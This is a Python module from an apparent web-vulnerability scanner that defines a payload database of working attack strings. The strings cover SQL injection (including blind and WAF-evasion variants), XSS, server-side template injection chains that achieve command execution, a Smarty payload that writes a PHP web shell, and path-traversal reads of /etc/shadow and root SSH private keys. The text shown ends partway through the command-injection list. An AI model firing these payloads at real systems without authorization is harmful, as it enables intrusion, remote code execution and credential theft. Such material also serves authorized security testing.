"""Adaptive payload engine — context-aware generation, mutation, encoding chains.

Central payload database with 1000+ entries across categories.
Plugins call ``PayloadEngine.get(category, context)`` instead of
maintaining their own hardcoded lists.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import StrEnum
from urllib.parse import quote

# ---------------------------------------------------------------------------
# Domain types
# ---------------------------------------------------------------------------

class PayloadCategory(StrEnum):
    SQLI = "sqli"
    XSS = "xss"
    SSTI = "ssti"
    LFI = "lfi"
    RCE = "rce"
    SSRF = "ssrf"
    XXE = "xxe"
    CRLF = "crlf"
    OPEN_REDIRECT = "redirect"
    NOSQLI = "nosqli"
    HEADER_INJECTION = "header"
    JWT = "jwt"
    PROTOTYPE_POLLUTION = "pp"


class InjectionContext(StrEnum):
    """Where the payload will land."""
    QUERY_PARAM = "query"
    POST_BODY = "body"
    HEADER_VALUE = "header"
    JSON_VALUE = "json"
    XML_VALUE = "xml"
    PATH_SEGMENT = "path"
    COOKIE_VALUE = "cookie"
    HTML_ATTR = "html_attr"
    HTML_TAG = "html_tag"
    JS_STRING = "js_string"
    URL_FRAGMENT = "fragment"


class DbmsType(StrEnum):
    MYSQL = "mysql"
    POSTGRES = "postgres"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    GENERIC = "generic"


@dataclass(frozen=True)
class Payload:
    """Single payload with metadata."""
    value: str
    category: PayloadCategory
    context: InjectionContext = InjectionContext.QUERY_PARAM
    dbms: DbmsType = DbmsType.GENERIC
    waf_level: int = 0          # 0=no evasion, 1=light, 2=medium, 3=heavy
    blind: bool = False
    time_delay: float = 0.0     # expected delay for time-based
    description: str = ""
    tags: tuple[str, ...] = ()


@dataclass
class MutationResult:
    """Result of mutating a payload."""
    original: str
    variants: list[str] = field(default_factory=list)
    technique: str = ""


# ---------------------------------------------------------------------------
# Payload database — organized by category
# ---------------------------------------------------------------------------

_SQLI_PAYLOADS: list[Payload] = [
    # --- Error-based generic ---
    Payload("'", PayloadCategory.SQLI, description="Single quote"),
    Payload('"', PayloadCategory.SQLI, description="Double quote"),
    Payload("1'", PayloadCategory.SQLI, description="Number + single quote"),
    Payload('1"', PayloadCategory.SQLI, description="Number + double quote"),
    Payload("1' OR '1'='1", PayloadCategory.SQLI, description="OR tautology"),
    Payload("1' OR '1'='1'--", PayloadCategory.SQLI, description="OR tautology + comment"),
    Payload("1' OR '1'='1'#", PayloadCategory.SQLI, description="OR tautology + hash comment"),
    Payload("' OR 1=1--", PayloadCategory.SQLI, description="Classic OR bypass"),
    Payload("' OR 1=1#", PayloadCategory.SQLI, description="OR bypass MySQL comment"),
    Payload('" OR 1=1--', PayloadCategory.SQLI, description="Double quote OR bypass"),
    Payload("') OR 1=1--", PayloadCategory.SQLI, description="Parenthesized OR bypass"),
    Payload("')) OR 1=1--", PayloadCategory.SQLI, description="Double paren OR bypass"),
    Payload("1; SELECT 1--", PayloadCategory.SQLI, description="Stacked query probe"),
    Payload("' UNION SELECT NULL--", PayloadCategory.SQLI, description="UNION probe 1 col"),
    Payload("' UNION SELECT NULL,NULL--", PayloadCategory.SQLI, description="UNION 2 cols"),
    Payload("' UNION SELECT NULL,NULL,NULL--", PayloadCategory.SQLI, description="UNION 3 cols"),
    Payload("1' AND 1=1--", PayloadCategory.SQLI, description="AND true condition"),
    Payload("1' AND 1=2--", PayloadCategory.SQLI, description="AND false condition"),
    Payload("1' AND 'a'='a", PayloadCategory.SQLI, description="String AND true"),
    Payload("1' AND 'a'='b", PayloadCategory.SQLI, description="String AND false"),
    Payload("1 AND 1=1", PayloadCategory.SQLI, description="Numeric AND true"),
    Payload("1 AND 1=2", PayloadCategory.SQLI, description="Numeric AND false"),
    Payload("' OR ''='", PayloadCategory.SQLI, description="Empty string OR"),
    Payload("1' ORDER BY 1--", PayloadCategory.SQLI, description="ORDER BY probe"),
    Payload("1' ORDER BY 100--", PayloadCategory.SQLI, description="ORDER BY overflow"),
    Payload("1' GROUP BY 1--", PayloadCategory.SQLI, description="GROUP BY probe"),
    # --- MySQL-specific ---
    Payload(
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        PayloadCategory.SQLI, dbms=DbmsType.MYSQL,
        description="MySQL EXTRACTVALUE error",
    ),
    Payload(
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        PayloadCategory.SQLI, dbms=DbmsType.MYSQL,
        description="MySQL UPDATEXML error",
    ),
    Payload(
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x "
        "FROM information_schema.tables GROUP BY x)a)--",
        PayloadCategory.SQLI, dbms=DbmsType.MYSQL,
        description="MySQL error-based double query",
    ),
    Payload(
        "' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--",
        PayloadCategory.SQLI, dbms=DbmsType.MYSQL,
        description="MySQL EXP overflow",
    ),
    # --- PostgreSQL-specific ---
    Payload(
        "' AND 1=CAST((SELECT version()) AS int)--",
        PayloadCategory.SQLI, dbms=DbmsType.POSTGRES,
        description="PostgreSQL cast error",
    ),
    Payload(
        "';SELECT pg_sleep(0)--",
        PayloadCategory.SQLI, dbms=DbmsType.POSTGRES,
        description="PostgreSQL stacked",
    ),
    # --- MSSQL-specific ---
    Payload(
        "' AND 1=CONVERT(int,@@version)--",
        PayloadCategory.SQLI, dbms=DbmsType.MSSQL,
        description="MSSQL CONVERT error",
    ),
    Payload(
        "'; EXEC xp_cmdshell('whoami')--",
        PayloadCategory.SQLI, dbms=DbmsType.MSSQL,
        description="MSSQL xp_cmdshell probe",
    ),
    Payload(
        "' HAVING 1=1--",
        PayloadCategory.SQLI, dbms=DbmsType.MSSQL,
        description="MSSQL HAVING error",
    ),
    # --- Oracle-specific ---
    Payload(
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version "
        "WHERE ROWNUM=1))--",
        PayloadCategory.SQLI, dbms=DbmsType.ORACLE,
        description="Oracle UTL_INADDR",
    ),
    # --- SQLite-specific ---
    Payload(
        "' AND 1=CAST(sqlite_version() AS int)--",
        PayloadCategory.SQLI, dbms=DbmsType.SQLITE,
        description="SQLite version cast",
    ),
    # --- Time-based blind ---
    Payload(
        "' OR SLEEP(5)-- -", PayloadCategory.SQLI, dbms=DbmsType.MYSQL,
        blind=True, time_delay=5.0, description="MySQL SLEEP",
    ),
    Payload(
        "' OR pg_sleep(5)-- -", PayloadCategory.SQLI, dbms=DbmsType.POSTGRES,
        blind=True, time_delay=5.0, description="PostgreSQL pg_sleep",
    ),
    Payload(
        "'; WAITFOR DELAY '0:0:5'-- -", PayloadCategory.SQLI, dbms=DbmsType.MSSQL,
        blind=True, time_delay=5.0, description="MSSQL WAITFOR",
    ),
    Payload(
        "' OR BENCHMARK(5000000,SHA1('test'))-- -", PayloadCategory.SQLI,
        dbms=DbmsType.MYSQL, blind=True, time_delay=5.0,
        description="MySQL BENCHMARK",
    ),
    Payload(
        "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--",
        PayloadCategory.SQLI, dbms=DbmsType.POSTGRES,
        blind=True, time_delay=5.0, description="PostgreSQL conditional sleep",
    ),
    Payload(
        "1' AND (SELECT * FROM (SELECT SLEEP(5))a)-- -",
        PayloadCategory.SQLI, dbms=DbmsType.MYSQL,
        blind=True, time_delay=5.0, description="MySQL subquery sleep",
    ),
    Payload(
        "1; SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) FROM DUAL--",
        PayloadCategory.SQLI, dbms=DbmsType.ORACLE,
        blind=True, time_delay=5.0, description="Oracle DBMS_PIPE sleep",
    ),
    # --- Boolean blind ---
    Payload(
        "' AND SUBSTRING(@@version,1,1)='5'--",
        PayloadCategory.SQLI, dbms=DbmsType.MYSQL,
        blind=True, description="MySQL boolean version probe",
    ),
    Payload(
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        PayloadCategory.SQLI, blind=True,
        description="Boolean table count",
    ),
    # --- WAF evasion variants ---
    Payload(
        "' /*!OR*/ 1=1-- -", PayloadCategory.SQLI, waf_level=1,
        description="MySQL conditional comment OR",
    ),
    Payload(
        "' O/**/R 1=1-- -", PayloadCategory.SQLI, waf_level=1,
        description="Comment-split OR",
    ),
    Payload(
        "'%20oR%201%3D1--%20-", PayloadCategory.SQLI, waf_level=2,
        description="URL-encoded OR bypass",
    ),
    Payload(
        "%27%20OR%201%3D1--%20-", PayloadCategory.SQLI, waf_level=2,
        description="Full URL-encoded injection",
    ),
    Payload(
        "' OR 1=1--\t-", PayloadCategory.SQLI, waf_level=1,
        description="Tab-separated comment",
    ),
    Payload(
        "'+OR+1=1--+-", PayloadCategory.SQLI, waf_level=1,
        description="Plus-encoded spaces",
    ),
]


_XSS_PAYLOADS: list[Payload] = [
    # --- Reflection probes ---
    Payload("<basilisk7x>", PayloadCategory.XSS, description="Tag injection probe"),
    Payload('"basilisk7x', PayloadCategory.XSS, description="Attr break double quote"),
    Payload("'basilisk7x", PayloadCategory.XSS, description="Attr break single quote"),
    Payload("javascript:basilisk7x", PayloadCategory.XSS, description="JS protocol probe"),
    # --- HTML context ---
    Payload(
        "<img src=x onerror=alert(1)>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="img onerror",
    ),
    Payload(
        "<svg onload=alert(1)>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="svg onload",
    ),
    Payload(
        "<details open ontoggle=alert(1)>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="details ontoggle",
    ),
    Payload(
        "<body onload=alert(1)>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="body onload",
    ),
    Payload(
        "<script>alert(1)</script>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="Classic script tag",
    ),
    Payload(
        "<iframe src=javascript:alert(1)>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="iframe JS protocol",
    ),
    Payload(
        "<input onfocus=alert(1) autofocus>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="input autofocus",
    ),
    Payload(
        "<marquee onstart=alert(1)>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="marquee onstart",
    ),
    Payload(
        "<video><source onerror=alert(1)>", PayloadCategory.XSS,
        context=InjectionContext.HTML_TAG, description="video source onerror",
    ),
    Payload(
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x></textarea>"
        "<img onerror=alert(1) src=1>",
        PayloadCategory.XSS, context=InjectionContext.HTML_TAG, waf_level=2,
        description="Nested tag confusion",
    ),
    Payload(
        "<svg><animate onbegin=alert(1) attributeName=x>",
        PayloadCategory.XSS, context=InjectionContext.HTML_TAG,
        description="SVG animate onbegin",
    ),
    Payload(
        "<object data=javascript:alert(1)>",
        PayloadCategory.XSS, context=InjectionContext.HTML_TAG,
        description="object data JS",
    ),
    Payload(
        "<a href=javascript:alert(1)>click</a>",
        PayloadCategory.XSS, context=InjectionContext.HTML_TAG,
        description="anchor JS href",
    ),
    # --- Attribute context ---
    Payload(
        '" onmouseover="alert(1)', PayloadCategory.XSS,
        context=InjectionContext.HTML_ATTR, description="Attr event dblquote",
    ),
    Payload(
        "' onmouseover='alert(1)", PayloadCategory.XSS,
        context=InjectionContext.HTML_ATTR, description="Attr event singlequote",
    ),
    Payload(
        '" onfocus="alert(1)" autofocus="', PayloadCategory.XSS,
        context=InjectionContext.HTML_ATTR, description="Attr autofocus",
    ),
    # --- JS context ---
    Payload(
        "'-alert(1)-'", PayloadCategory.XSS,
        context=InjectionContext.JS_STRING, description="JS string break single",
    ),
    Payload(
        '"-alert(1)-"', PayloadCategory.XSS,
        context=InjectionContext.JS_STRING, description="JS string break double",
    ),
    Payload(
        "\\'-alert(1)//", PayloadCategory.XSS,
        context=InjectionContext.JS_STRING, description="JS escaped break",
    ),
    Payload(
        "</script><script>alert(1)</script>", PayloadCategory.XSS,
        context=InjectionContext.JS_STRING, description="Script tag break",
    ),
    # --- WAF evasion ---
    Payload(
        "<img/src=x onerror=alert(1)>", PayloadCategory.XSS, waf_level=1,
        description="Slash separator",
    ),
    Payload(
        "<svg/onload=alert(1)>", PayloadCategory.XSS, waf_level=1,
        description="SVG slash separator",
    ),
    Payload(
        "<img src=x onerror=alert`1`>", PayloadCategory.XSS, waf_level=1,
        description="Backtick invocation",
    ),
    Payload(
        "<svg onload=alert&lpar;1&rpar;>", PayloadCategory.XSS, waf_level=2,
        description="HTML entity parens",
    ),
    Payload(
        "<img src=x onerror=\\u0061lert(1)>", PayloadCategory.XSS, waf_level=2,
        description="Unicode escape alert",
    ),
    Payload(
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/**/oNcliCk=alert())//%0D%0A",
        PayloadCategory.XSS, waf_level=3,
        description="Polyglot XSS",
    ),
]


_SSTI_PAYLOADS: list[Payload] = [
    # --- Universal detection probes ---
    Payload("{{7*7}}", PayloadCategory.SSTI, description="Jinja2/Twig basic"),
    Payload("${7*7}", PayloadCategory.SSTI, description="Freemarker/Velocity/Thymeleaf"),
    Payload("#{7*7}", PayloadCategory.SSTI, description="Ruby ERB / Thymeleaf"),
    Payload("<%= 7*7 %>", PayloadCategory.SSTI, description="ERB tag"),
    Payload("{{7*'7'}}", PayloadCategory.SSTI, description="Jinja2 string multiply"),
    Payload("@(1+1)", PayloadCategory.SSTI, description="Razor syntax"),
    Payload("${{<%[%'\"}}%\\", PayloadCategory.SSTI, description="Polyglot SSTI probe"),
    Payload("{{4*4}}[[5*5]]", PayloadCategory.SSTI, description="Multi-engine probe"),
    Payload("{{33*33}}", PayloadCategory.SSTI, description="Large math probe (1089)"),
    Payload("${33*33}", PayloadCategory.SSTI, description="EL large math (1089)"),
    Payload("#{33*33}", PayloadCategory.SSTI, description="EL/ERB large math (1089)"),
    Payload("<%= 33*33 %>", PayloadCategory.SSTI, description="ERB large math (1089)"),
    Payload("{##}", PayloadCategory.SSTI, description="Twig comment probe"),
    Payload("{# comment #}", PayloadCategory.SSTI, description="Jinja2 comment probe"),
    Payload("{{dump(1)}}", PayloadCategory.SSTI, description="Twig dump function"),
    # --- Jinja2 (Python/Flask) ---
    Payload("{{config}}", PayloadCategory.SSTI, description="Jinja2 config leak"),
    Payload("{{config.items()}}", PayloadCategory.SSTI, description="Jinja2 config items"),
    Payload("{{request.environ}}", PayloadCategory.SSTI, description="Jinja2 environ"),
    Payload("{{request.args}}", PayloadCategory.SSTI, description="Jinja2 request.args"),
    Payload(
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        PayloadCategory.SSTI, waf_level=1, description="Jinja2 class chain",
    ),
    Payload(
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        PayloadCategory.SSTI, waf_level=1, description="Jinja2 class chain v2",
    ),
    Payload(
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        PayloadCategory.SSTI, waf_level=2, description="Jinja2 RCE via request",
    ),
    Payload(
        "{{self._TemplateReference__context.cycler.__init__.__globals__"
        ".os.popen('id').read()}}",
        PayloadCategory.SSTI, waf_level=2, description="Jinja2 RCE via cycler",
    ),
    Payload(
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        PayloadCategory.SSTI, waf_level=2, description="Jinja2 RCE via lipsum",
    ),
    Payload(
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        PayloadCategory.SSTI, waf_level=2, description="Jinja2 RCE via namespace",
    ),
    Payload(
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        PayloadCategory.SSTI, waf_level=2, description="Jinja2 RCE via joiner",
    ),
    Payload(
        "{%for x in ().__class__.__base__.__subclasses__()%}"
        "{%if 'warning' in x.__name__%}{{x()._module.__builtins__"
        "['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
        PayloadCategory.SSTI, waf_level=3, description="Jinja2 RCE loop bypass",
    ),
    # --- Twig (PHP/Symfony) ---
    Payload("{{7*'7'}}", PayloadCategory.SSTI, description="Twig string repeat (49 vs 7777777)"),
    Payload("{{_self.env.display('id')}}", PayloadCategory.SSTI,
            waf_level=1, description="Twig _self env"),
    Payload(
        "{{['id']|filter('system')}}",
        PayloadCategory.SSTI, waf_level=2, description="Twig filter system",
    ),
    Payload(
        "{{['id']|map('system')|join}}",
        PayloadCategory.SSTI, waf_level=2, description="Twig map system",
    ),
    Payload(
        "{{app.request.server.all|join(',')}}",
        PayloadCategory.SSTI, waf_level=1, description="Twig server vars",
    ),
    Payload(
        "{{'id'|filter('system')}}",
        PayloadCategory.SSTI, waf_level=2, description="Twig filter RCE",
    ),
    # --- Mako (Python) ---
    Payload("${7*7}", PayloadCategory.SSTI, description="Mako EL math"),
    Payload(
        "${self.module.cache.util.os.popen('id').read()}",
        PayloadCategory.SSTI, waf_level=2, description="Mako module cache RCE",
    ),
    Payload(
        "<%import os%>${os.popen('id').read()}",
        PayloadCategory.SSTI, waf_level=2, description="Mako import RCE",
    ),
    # --- Tornado (Python) ---
    Payload(
        "{%import os%}{{os.popen('id').read()}}",
        PayloadCategory.SSTI, waf_level=2, description="Tornado import RCE",
    ),
    Payload(
        "{{handler.settings}}",
        PayloadCategory.SSTI, waf_level=1, description="Tornado settings leak",
    ),
    # --- Freemarker (Java) ---
    Payload(
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        PayloadCategory.SSTI, waf_level=2, description="Freemarker Execute",
    ),
    Payload(
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        PayloadCategory.SSTI, waf_level=2, description="Freemarker assign Execute",
    ),
    Payload(
        "${object.class.forName('java.lang.Runtime').getRuntime().exec('id')}",
        PayloadCategory.SSTI, waf_level=2, description="Freemarker Runtime exec",
    ),
    # --- Velocity (Java) ---
    Payload(
        "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n"
        "#set($chr=$x.class.forName('java.lang.Character'))##\n"
        "#set($str=$x.class.forName('java.lang.String'))##",
        PayloadCategory.SSTI, waf_level=2, description="Velocity class loading",
    ),
    Payload(
        "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
        PayloadCategory.SSTI, waf_level=2, description="Velocity inspect RCE",
    ),
    # --- Thymeleaf (Java/Spring) ---
    Payload(
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        PayloadCategory.SSTI, waf_level=2, description="Spring EL RCE",
    ),
    Payload(
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        PayloadCategory.SSTI, waf_level=2, description="Thymeleaf preprocessor RCE",
    ),
    Payload(
        "*{T(org.apache.commons.io.IOUtils).toString("
        "T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
        PayloadCategory.SSTI, waf_level=3, description="Thymeleaf IOUtils RCE",
    ),
    # --- Smarty (PHP) ---
    Payload("{php}echo `id`;{/php}", PayloadCategory.SSTI,
            waf_level=2, description="Smarty PHP tag RCE"),
    Payload(
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd'])"
        ";?>\",self::clearConfig())}",
        PayloadCategory.SSTI, waf_level=3, description="Smarty writeFile RCE",
    ),
    Payload("{system('id')}", PayloadCategory.SSTI,
            waf_level=2, description="Smarty system RCE"),
    Payload("{if system('id')}{/if}", PayloadCategory.SSTI,
            waf_level=2, description="Smarty if system RCE"),
    # --- Pebble (Java) ---
    Payload(
        '{% set cmd = "id" %}{% set runtime = beans.get("runtime") %}'
        "{{ runtime.exec(cmd) }}",
        PayloadCategory.SSTI, waf_level=2, description="Pebble beans RCE",
    ),
    # --- Jade/Pug (Node.js) ---
    Payload(
        "#{function(){localLoad=global.process.mainModule.constructor._load;"
        "sh=localLoad('child_process').execSync('id').toString()}()}",
        PayloadCategory.SSTI, waf_level=2, description="Jade/Pug RCE",
    ),
    # --- EJS (Node.js) ---
    Payload(
        "<%= process.mainModule.require('child_process').execSync('id').toString() %>",
        PayloadCategory.SSTI, waf_level=2, description="EJS RCE require",
    ),
    # --- Handlebars (Node.js) ---
    Payload(
        "{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n"
        "{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n"
        "{{this.pop}}\n{{#with string.split as |codelist|}}\n"
        "{{this.pop}}\n{{this.push \"return require('child_process')"
        ".execSync('id');\" }}\n{{this.pop}}\n{{#each conslist}}\n"
        "{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n"
        "{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}",
        PayloadCategory.SSTI, waf_level=3, description="Handlebars RCE chain",
    ),
    # --- Nunjucks (Node.js) ---
    Payload(
        "{{range.constructor(\"return global.process.mainModule.require"
        "('child_process').execSync('id').toString()\")()}}",
        PayloadCategory.SSTI, waf_level=2, description="Nunjucks constructor RCE",
    ),
    # --- ERB (Ruby) ---
    Payload("<%= `id` %>", PayloadCategory.SSTI, waf_level=2, description="ERB backtick RCE"),
    Payload("<%= system('id') %>", PayloadCategory.SSTI,
            waf_level=2, description="ERB system RCE"),
    Payload("<%= IO.popen('id').read %>", PayloadCategory.SSTI,
            waf_level=2, description="ERB IO.popen RCE"),
    # --- Slim (Ruby) ---
    Payload("= `id`", PayloadCategory.SSTI, waf_level=2, description="Slim backtick RCE"),
    # --- Mustache (logicless — used for detection only) ---
    Payload("{{.}}", PayloadCategory.SSTI, description="Mustache context dump"),
    Payload("{{#each this}}{{@key}}={{this}} {{/each}}", PayloadCategory.SSTI,
            description="Mustache iterate context"),
    # --- Blind SSTI (time-based) ---
    Payload(
        "{{range(999999999)|list}}",
        PayloadCategory.SSTI, blind=True, time_delay=5.0,
        description="Jinja2 range DoS blind",
    ),
    Payload(
        "${Thread.sleep(5000)}",
        PayloadCategory.SSTI, blind=True, time_delay=5.0,
        description="Java EL Thread.sleep blind",
    ),
    Payload(
        "{{''.__class__.__mro__[1].__subclasses__()[223]('sleep 5',shell=True,stdout=-1)"
        ".communicate()}}",
        PayloadCategory.SSTI, blind=True, time_delay=5.0,
        description="Jinja2 subprocess blind",
    ),
    # --- WAF bypass variants ---
    Payload(
        "{{''['__cla'+'ss__']['__mr'+'o__'][1]['__subcla'+'sses__']()}}",
        PayloadCategory.SSTI, waf_level=2, description="Jinja2 string concat bypass",
    ),
    Payload(
        "{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}",
        PayloadCategory.SSTI, waf_level=2, description="Jinja2 attr() bypass",
    ),
    Payload(
        "{% set a='__cla' %}{% set b='ss__' %}{{''[a~b]}}",
        PayloadCategory.SSTI, waf_level=3, description="Jinja2 tilde concat bypass",
    ),
    Payload(
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
        PayloadCategory.SSTI, waf_level=3, description="Jinja2 hex escape bypass",
    ),
]


_LFI_PAYLOADS: list[Payload] = [
    # --- Classic path traversal ---
    Payload("../../../etc/passwd", PayloadCategory.LFI, description="Classic Linux LFI"),
    Payload("../../../../etc/passwd", PayloadCategory.LFI, description="4-level traversal"),
    Payload("../../../../../etc/passwd", PayloadCategory.LFI, description="5-level traversal"),
    Payload("../../../../../../etc/passwd", PayloadCategory.LFI, description="6-level traversal"),
    Payload("..\\..\\..\\windows\\win.ini", PayloadCategory.LFI, description="Windows LFI"),
    Payload("..\\..\\..\\..\\windows\\win.ini", PayloadCategory.LFI,
            description="Windows 4-level"),
    Payload("/etc/passwd", PayloadCategory.LFI, description="Absolute path"),
    Payload("C:\\Windows\\win.ini", PayloadCategory.LFI, description="Windows absolute"),
    Payload("C:\\boot.ini", PayloadCategory.LFI, description="Windows boot.ini"),
    # --- Encoding bypass ---
    Payload("....//....//....//etc/passwd", PayloadCategory.LFI, description="Double dot bypass"),
    Payload("..%2f..%2f..%2fetc%2fpasswd", PayloadCategory.LFI, waf_level=1,
            description="URL-encoded traversal"),
    Payload("..%252f..%252f..%252fetc%252fpasswd", PayloadCategory.LFI, waf_level=2,
            description="Double-encoded traversal"),
    Payload("%2e%2e/%2e%2e/%2e%2e/etc/passwd", PayloadCategory.LFI, waf_level=1,
            description="Encoded dots"),
    Payload("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", PayloadCategory.LFI, waf_level=1,
            description="Full encoded traversal"),
    Payload("..%c0%af..%c0%af..%c0%afetc/passwd", PayloadCategory.LFI, waf_level=2,
            description="Overlong UTF-8 slash"),
    Payload("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", PayloadCategory.LFI, waf_level=2,
            description="Unicode fullwidth slash"),
    Payload("..%5c..%5c..%5cwindows%5cwin.ini", PayloadCategory.LFI, waf_level=1,
            description="URL-encoded backslash"),
    Payload("..%255c..%255c..%255cwindows%255cwin.ini", PayloadCategory.LFI, waf_level=2,
            description="Double-encoded backslash"),
    Payload("..\\..\\..\\/etc/passwd", PayloadCategory.LFI, waf_level=1,
            description="Mixed slash traversal"),
    # --- Null byte injection ---
    Payload("../../../etc/passwd%00", PayloadCategory.LFI, waf_level=1,
            description="Null byte termination"),
    Payload("../../../etc/passwd%00.jpg", PayloadCategory.LFI, waf_level=1,
            description="Null byte + ext bypass"),
    Payload("../../../etc/passwd%00.html", PayloadCategory.LFI, waf_level=1,
            description="Null byte + html ext"),
    Payload("....//....//....//etc/passwd%00", PayloadCategory.LFI, waf_level=1,
            description="Double dot + null byte"),
    # --- PHP wrappers ---
    Payload("php://filter/convert.base64-encode/resource=/etc/passwd", PayloadCategory.LFI,
            description="PHP filter base64"),
    Payload("php://filter/read=string.rot13/resource=/etc/passwd", PayloadCategory.LFI,
            description="PHP filter rot13"),
    Payload("php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",
            PayloadCategory.LFI, description="PHP filter iconv"),
    Payload("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
            PayloadCategory.LFI, description="PHP filter zlib+base64"),
    Payload("php://filter/convert.base64-encode/resource=index.php", PayloadCategory.LFI,
            description="PHP filter source code"),
    Payload("php://input", PayloadCategory.LFI, description="PHP input wrapper"),
    Payload("php://memory", PayloadCategory.LFI, description="PHP memory wrapper"),
    Payload(
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        PayloadCategory.LFI, description="PHP data wrapper RCE",
    ),
    Payload("data://text/plain,<?php system('id');?>", PayloadCategory.LFI,
            description="PHP data wrapper plain"),
    Payload("expect://id", PayloadCategory.LFI, description="PHP expect wrapper"),
    Payload("phar://test.phar/test.txt", PayloadCategory.LFI, description="PHP phar wrapper"),
    Payload("zip://test.zip%23test.txt", PayloadCategory.LFI, description="PHP zip wrapper"),
    # --- Protocol wrappers ---
    Payload("file:///etc/passwd", PayloadCategory.LFI, description="File protocol"),
    Payload("file:///etc/shadow", PayloadCategory.LFI, description="File shadow"),
    Payload("file:///etc/hosts", PayloadCategory.LFI, description="File hosts"),
    Payload("file:///proc/version", PayloadCategory.LFI, description="File proc version"),
    # --- Linux proc filesystem ---
    Payload("/proc/self/environ", PayloadCategory.LFI, description="Linux environ"),
    Payload("/proc/self/fd/0", PayloadCategory.LFI, description="Linux fd 0"),
    Payload("/proc/self/fd/1", PayloadCategory.LFI, description="Linux fd 1"),
    Payload("/proc/self/fd/2", PayloadCategory.LFI, description="Linux fd 2"),
    Payload("/proc/self/cmdline", PayloadCategory.LFI, description="Linux cmdline"),
    Payload("/proc/self/status", PayloadCategory.LFI, description="Linux proc status"),
    Payload("/proc/self/cwd/index.php", PayloadCategory.LFI, description="CWD source code"),
    Payload("/proc/self/maps", PayloadCategory.LFI, description="Memory maps"),
    Payload("/proc/version", PayloadCategory.LFI, description="Kernel version"),
    Payload("/proc/net/tcp", PayloadCategory.LFI, description="TCP connections"),
    # --- Log poisoning targets ---
    Payload("/var/log/apache2/access.log", PayloadCategory.LFI, description="Apache access log"),
    Payload("/var/log/apache2/error.log", PayloadCategory.LFI, description="Apache error log"),
    Payload("/var/log/nginx/access.log", PayloadCategory.LFI, description="Nginx access log"),
    Payload("/var/log/nginx/error.log", PayloadCategory.LFI, description="Nginx error log"),
    Payload("/var/log/auth.log", PayloadCategory.LFI, description="Auth log (SSH attempts)"),
    Payload("/var/log/mail.log", PayloadCategory.LFI, description="Mail log"),
    Payload("/var/log/syslog", PayloadCategory.LFI, description="Syslog"),
    # --- Config files ---
    Payload("/etc/shadow", PayloadCategory.LFI, description="Shadow passwords"),
    Payload("/etc/group", PayloadCategory.LFI, description="Group file"),
    Payload("/etc/hostname", PayloadCategory.LFI, description="Hostname"),
    Payload("/etc/issue", PayloadCategory.LFI, description="System banner"),
    Payload("/etc/nginx/nginx.conf", PayloadCategory.LFI, description="Nginx config"),
    Payload("/etc/apache2/apache2.conf", PayloadCategory.LFI, description="Apache config"),
    Payload("/etc/mysql/my.cnf", PayloadCategory.LFI, description="MySQL config"),
    Payload("/etc/ssh/sshd_config", PayloadCategory.LFI, description="SSH config"),
    Payload("/root/.bash_history", PayloadCategory.LFI, description="Root bash history"),
    Payload("/root/.ssh/id_rsa", PayloadCategory.LFI, description="Root SSH private key"),
    Payload("/home/www-data/.ssh/id_rsa", PayloadCategory.LFI, description="Web user SSH key"),
]


_RCE_PAYLOADS: list[Payload] = [
    # --- Basic injection operators ---
    Payload("; id", PayloadCategory.RCE, description="Semicolon injection"),
    Payload("| id", PayloadCategory.RCE, description="Pipe injection"),
    Payload("|| id", PayloadCategory.RCE, description="OR pipe injection"),
    Payload("& id", PayloadCategory.RCE, description="Background injection"),
    Payload("&& id", PayloadCategory.RCE, description="AND injection"),
    Payload("`id`", PayloadCategory.RCE, description="Backtick injection"),
    Payload("$(id)", PayloadCategory.RCE, description="Subshell injection"),
